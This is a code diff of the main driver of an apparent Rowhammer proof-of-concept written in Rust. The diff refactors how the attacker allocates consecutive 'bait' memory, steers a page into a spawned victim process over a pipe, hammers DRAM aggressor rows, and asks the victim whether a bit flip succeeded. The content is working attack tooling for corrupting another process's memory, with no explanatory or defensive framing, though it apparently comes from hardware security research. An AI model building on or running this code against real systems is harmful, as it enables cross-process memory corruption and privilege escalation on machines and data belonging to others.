@@ -4,30 +4,27 @@ use std::{
     fs::File,
     io::{stdin, BufRead, BufReader},
     process::{Child, ChildStdin, ChildStdout, Command},
-    thread::{self, sleep},
-    time::Duration,
+    thread::{self},
 };
 
 use anyhow::{bail, Context};
+use bs_poc::memory::ConsecCheck;
 use bs_poc::{
     forge::{
         FuzzSummary, HammerResult, Hammerer, Hammering, HammeringPattern, PatternAddressMapper,
     },
     jitter::AggressorPtr,
     memory::{
-        compact_mem, construct_memory_tuple_timer, AllocChecker, ConsecAllocBuddyInfo,
-        ConsecAllocCoCo, ConsecAllocHugepageRnd, ConsecAllocMmap, ConsecAllocator, ConsecBlocks,
-        ConsecCheckBankTiming, ConsecCheckPfn, HugepageAllocator, MemBlock, PfnResolver,
+        compact_mem, ConsecAllocBuddyInfo, ConsecAllocCoCo, ConsecAllocHugepageRnd,
+        ConsecAllocMmap, ConsecAllocator, ConsecBlocks, ConsecCheckBankTiming, ConsecCheckNone,
+        ConsecCheckPfn, HugepageAllocator, MemBlock, PfnResolver,
     },
     retry,
-    util::{
-        make_vec, BlacksmithConfig, MemConfiguration, PipeIPC, ATTACKER_READY, IPC, MB, PAGE_SIZE,
-        VICTIM_ALLOC_DONE, VICTIM_ALLOC_READY,
-    },
+    util::{AttackState, BlacksmithConfig, MemConfiguration, PipeIPC, IPC, PAGE_SIZE},
     victim::{HammerVictim, HammerVictimMemCheck},
 };
 use clap::Parser;
-use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
+use indicatif::MultiProgress;
 use indicatif_log_bridge::LogWrapper;
 use log::{info, warn};
 
@@ -59,8 +56,9 @@ struct CliArgs {
 
 #[derive(clap::ValueEnum, Clone, Debug)]
 pub enum ConsecCheckType {
-    Pfn,
     BankTiming,
+    None,
+    Pfn,
 }
 
 #[derive(clap::ValueEnum, Clone, Debug)]
@@ -71,19 +69,6 @@ pub enum ConsecAllocType {
     Hugepage,
     HugepageRnd,
     Mmap,
-}
-
-fn _prog() -> Option<String> {
-    env::args().next().as_ref().cloned()
-}
-
-/// Send a signal `sig` to the process `pid`
-fn _signal(sig: &str, pid: u32) -> anyhow::Result<()> {
-    let mut kill = Command::new("kill")
-        .args(["-s", sig, &pid.to_string()])
-        .spawn()?;
-    kill.wait()?;
-    Ok(())
 }
 
 fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
@@ -125,23 +110,6 @@ fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
     Ok(pattern)
 }
 
-/**
- * A helper enum to create a checker from CLI arguments. This allows us to circumvent heap allocation
- */
-enum ConsecCheck {
-    Pfn(ConsecCheckPfn),
-    BankTiming(ConsecCheckBankTiming),
-}
-
-impl AllocChecker for ConsecCheck {
-    fn check(&mut self, block: &MemBlock) -> anyhow::Result<bool> {
-        match self {
-            ConsecCheck::Pfn(c) => c.check(block),
-            ConsecCheck::BankTiming(c) => c.check(block),
-        }
-    }
-}
-
 fn create_consec_checker_from_cli(
     consec_check: ConsecCheckType,
     mem_config: MemConfiguration,
@@ -149,15 +117,11 @@ fn create_consec_checker_from_cli(
     progress: Option<MultiProgress>,
 ) -> anyhow::Result<ConsecCheck> {
     Ok(match consec_check {
+        ConsecCheckType::None => ConsecCheck::None(ConsecCheckNone {}),
         ConsecCheckType::Pfn => ConsecCheck::Pfn(ConsecCheckPfn {}),
-        ConsecCheckType::BankTiming => {
-            ConsecCheck::BankTiming(ConsecCheckBankTiming::new_with_progress(
-                mem_config,
-                construct_memory_tuple_timer()?,
-                conflict_threshold,
-                progress,
-            ))
-        }
+        ConsecCheckType::BankTiming => ConsecCheck::BankTiming(
+            ConsecCheckBankTiming::new_with_progress(mem_config, conflict_threshold, progress),
+        ),
     })
 }
 
@@ -186,37 +150,30 @@ impl ConsecAllocator for ConsecAlloc {
     unsafe fn alloc_consec_blocks(
         &mut self,
         size: usize,
-        progress_cb: impl Fn(),
     ) -> anyhow::Result<bs_poc::memory::ConsecBlocks> {
         match self {
-            ConsecAlloc::BuddyInfo(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
-            ConsecAlloc::CoCo(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
-            ConsecAlloc::Hugepage(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
-            ConsecAlloc::HugepageRnd(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
-            ConsecAlloc::Mmap(alloc) => alloc.alloc_consec_blocks(size, progress_cb),
+            ConsecAlloc::BuddyInfo(alloc) => alloc.alloc_consec_blocks(size),
+            ConsecAlloc::CoCo(alloc) => alloc.alloc_consec_blocks(size),
+            ConsecAlloc::Hugepage(alloc) => alloc.alloc_consec_blocks(size),
+            ConsecAlloc::HugepageRnd(alloc) => alloc.alloc_consec_blocks(size),
+            ConsecAlloc::Mmap(alloc) => alloc.alloc_consec_blocks(size),
         }
     }
 }
 
 fn create_allocator_from_cli(
     alloc_strategy: ConsecAllocType,
-    consec_checker: Box<dyn AllocChecker>,
+    consec_checker: ConsecCheck,
+    progress: Option<MultiProgress>,
 ) -> ConsecAlloc {
     match alloc_strategy {
         ConsecAllocType::BuddyInfo => {
             ConsecAlloc::BuddyInfo(ConsecAllocBuddyInfo::new(consec_checker))
         }
         ConsecAllocType::CoCo => ConsecAlloc::CoCo(ConsecAllocCoCo {}),
-        ConsecAllocType::Mmap => ConsecAlloc::Mmap(ConsecAllocMmap::new(consec_checker)),
+        ConsecAllocType::Mmap => ConsecAlloc::Mmap(ConsecAllocMmap::new(consec_checker, progress)),
         ConsecAllocType::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::new()),
-        ConsecAllocType::HugepageRnd => {
-            let hugepages = make_vec(10, |_| unsafe {
-                HugepageAllocator::new()
-                    .alloc_consec_blocks(1024 * MB, || {})
-                    .expect("hugepage alloc")
-            });
-            ConsecAlloc::HugepageRnd(ConsecAllocHugepageRnd::new(hugepages))
-        }
+        ConsecAllocType::HugepageRnd => ConsecAlloc::HugepageRnd(ConsecAllocHugepageRnd::new(1)),
     }
 }
 
@@ -251,41 +208,27 @@ fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
 }
 
 unsafe fn alloc_memory(
-    mem_config: MemConfiguration,
-    threshold: u64,
     mut alloc_strategy: ConsecAlloc,
+    mem_config: MemConfiguration,
     mapping: &PatternAddressMapper,
-    progress: &MultiProgress,
 ) -> anyhow::Result<ConsecBlocks> {
     let block_size = alloc_strategy.block_size();
     let block_shift = block_size.ilog2() as usize;
     let num_sets = mapping.aggressor_sets(mem_config, block_shift).len();
-    let num_blocks = num_sets * block_size;
 
-    let pg = ProgressBar::new(num_blocks as u64).with_style(
-        ProgressStyle::with_template(
-            "Blocks: [{elapsed_precise} ({eta} remaining)] {bar:40.cyan/blue} {pos:>7}/{len:7}",
-        )
-        .unwrap(),
-    );
-    let pg = progress.add(pg);
-    pg.enable_steady_tick(Duration::from_secs(1));
-
-    pg.set_length(num_sets as u64);
     compact_mem()?;
-    pg.set_position(0);
-    let memory = alloc_strategy.alloc_consec_blocks(num_sets * block_size, || pg.inc(1))?;
+    let memory = alloc_strategy.alloc_consec_blocks(num_sets * block_size)?;
     memory.log_pfns();
-    pg.finish_and_clear();
     Ok(memory)
 }
 
 fn hammer(
     pattern: HammeringPattern,
     mapping: PatternAddressMapper,
+    victim: &mut dyn HammerVictim,
     mem_config: MemConfiguration,
     block_size: usize,
-    memory: ConsecBlocks,
+    memory: &ConsecBlocks,
 ) -> anyhow::Result<HammerResult> {
     let block_shift = block_size.ilog2();
     let hammering_addrs = mapping.get_hammering_addresses_relocate(
@@ -302,11 +245,22 @@ fn hammer(
         &hammering_addrs,
         &memory.blocks,
     )?;
-    //let hammerer = DummyHammerer::new(&memory, 17);
-    let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);
+    /*let flip = mapping.get_bitflips_relocate(mem_config, &memory);
+    let flip = flip
+        .concat()
+        .pop()
+        .unwrap_or(memory.blocks[0].byte_add(0x42).ptr) as *mut u8;
+    info!(
+        "Running dummy hammerer with flip at VA 0x{:02x}",
+        flip as usize
+    );
+    let hammerer = DummyHammerer::new(&memory, flip);*/
+
+    let flips = mapping.bit_flips;
+    info!("Expected bitflips: {:?}", flips);
 
     info!("Hammering pattern. This might take a while...");
-    let res = hammerer.hammer(&mut victim, 3);
+    let res = hammerer.hammer(victim, 3);
     match &res {
         Ok(res) => {
             info!("{:?}", res);
@@ -316,7 +270,6 @@ fn hammer(
             warn!("Hammering not successful: {:?}", e);
         }
     }
-    memory.dealloc();
     res
 }
 
@@ -349,40 +302,25 @@ fn spawn_victim(victim: &[String]) -> anyhow::Result<Option<Child>, std::io::Err
         .transpose()
 }
 
-fn inject_page(victim: &mut Option<Child>) -> anyhow::Result<()> {
-    match victim {
-        Some(victim) => {
-            let mut channel = piped_channel(victim)?;
-            // signal victim
-            sleep(Duration::from_secs(1));
-            channel.send(ATTACKER_READY)?;
+fn inject_page<P: IPC<AttackState>>(channel: &mut P) -> anyhow::Result<()> {
+    channel.send(AttackState::AttackerReady)?;
 
-            let b = MemBlock::mmap(PAGE_SIZE)?;
-            let pfn = b.pfn()?;
-            info!("Victim block PFN: 0x{:02x}", pfn);
+    let b = MemBlock::mmap(PAGE_SIZE)?;
+    let pfn = b.pfn()?;
+    info!("Victim block PFN: 0x{:02x}", pfn);
 
-            info!("Waiting for signal {}", VICTIM_ALLOC_READY);
-            channel.wait_for(VICTIM_ALLOC_READY)?;
-            info!("Received signal {}", VICTIM_ALLOC_READY);
+    info!("Waiting for signal {:?}", AttackState::VictimAllocReady);
+    channel.wait_for(AttackState::VictimAllocReady)?;
+    info!("Received signal {:?}", AttackState::VictimAllocReady);
 
-            b.dealloc();
-            warn!("TODO release victim page (determined by mapping)");
-
-            info!("Waiting for signal {}", VICTIM_ALLOC_DONE);
-            channel.wait_for(VICTIM_ALLOC_DONE)?;
-            info!("Received signal {}", VICTIM_ALLOC_DONE);
-            channel.close()?;
-        }
-        None => warn!(
-            "No target specified. Consider `./hammer --config [...] your_victim your_victim_args`"
-        ),
-    }
+    b.dealloc();
+    warn!("TODO release victim page (determined by mapping)");
     Ok(())
 }
 
 fn piped_channel(child: &mut Child) -> anyhow::Result<PipeIPC<ChildStdout, ChildStdin>> {
-    let child_in = child.stdin.take().context("stdin")?;
-    let child_out = child.stdout.take().context("stdout")?;
+    let child_in = child.stdin.take().context("piped_channel stdin")?;
+    let child_out = child.stdout.take().context("piped_channel stdout")?;
     Ok(PipeIPC::new(child_out, child_in))
 }
 
@@ -392,6 +330,30 @@ fn init_logging_with_progress() -> anyhow::Result<MultiProgress> {
     let progress = MultiProgress::new();
     LogWrapper::new(progress.clone(), logger).try_init()?;
     Ok(progress)
+}
+
+struct VictimProcess<P> {
+    pipe: P,
+}
+impl<P: IPC<AttackState>> HammerVictim for VictimProcess<P> {
+    fn init(&mut self) {
+        info!("Victim process initialized");
+    }
+
+    fn check(&mut self) -> bool {
+        info!("Victim process check");
+        self.pipe
+            .send(AttackState::AttackerHammerDone)
+            .expect("send");
+        info!("Reading pipe");
+        let state = self.pipe.receive().expect("receive");
+        info!("Received state: {:?}", state);
+        state == AttackState::VictimHammerSuccess
+    }
+
+    fn log_report(&self, _base_msb: AggressorPtr) {
+        info!("Victim process report");
+    }
 }
 
 unsafe fn _main() -> anyhow::Result<()> {
@@ -409,31 +371,44 @@ unsafe fn _main() -> anyhow::Result<()> {
         config.threshold,
         Some(progress.clone()),
     )?;
-    let alloc_strategy = create_allocator_from_cli(args.alloc_strategy, Box::new(consec_checker));
+    let alloc_strategy =
+        create_allocator_from_cli(args.alloc_strategy, consec_checker, Some(progress.clone()));
     let block_size = alloc_strategy.block_size();
+
+    info!("Starting bait allocation");
+    let memory = alloc_memory(alloc_strategy, mem_config, &pattern.mapping)?;
+    info!("Memory allocated: {:?}", memory);
 
     let mut victim = spawn_victim(&args.target)?;
     log_victim_stderr(&mut victim)?;
-    info!("Launch bait allocation");
 
-    let memory = alloc_memory(
-        mem_config,
-        config.threshold,
-        alloc_strategy,
-        &pattern.mapping,
-        &progress,
-    )?;
-
-    inject_page(&mut victim)?;
+    let mut hammer_victim: Box<dyn HammerVictim> = match &mut victim {
+        Some(victim) => {
+            let mut pipe: PipeIPC<ChildStdout, ChildStdin> = piped_channel(victim)?;
+            inject_page(&mut pipe)?;
+            Box::new(VictimProcess { pipe })
+        }
+        None => {
+            warn!(
+            "No target specified. Consider `./hammer --config [...] your_victim your_victim_args`"
+        );
+            Box::new(HammerVictimMemCheck::new(mem_config, &memory))
+        }
+    };
 
     let result = hammer(
         pattern.pattern,
         pattern.mapping,
+        &mut *hammer_victim,
         mem_config,
         block_size,
-        memory,
+        &memory,
     )?;
     info!("Hammering result: {:?}", result);
+
+    drop(hammer_victim);
+
+    memory.dealloc();
 
     if let Some(victim) = victim {
         info!("Waiting for victim to finish");
